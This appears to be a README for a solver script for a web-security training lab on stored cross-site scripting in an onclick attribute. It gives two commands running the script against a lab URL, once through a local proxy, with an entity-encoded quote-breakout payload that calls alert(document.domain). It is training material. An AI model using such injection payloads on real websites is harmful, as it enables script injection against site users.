# How to run script.py

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "&apos;-alert(document.domain)-&apos;"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "&apos;-alert(document.domain)-&apos;" -p 127.0.0.1:8080`
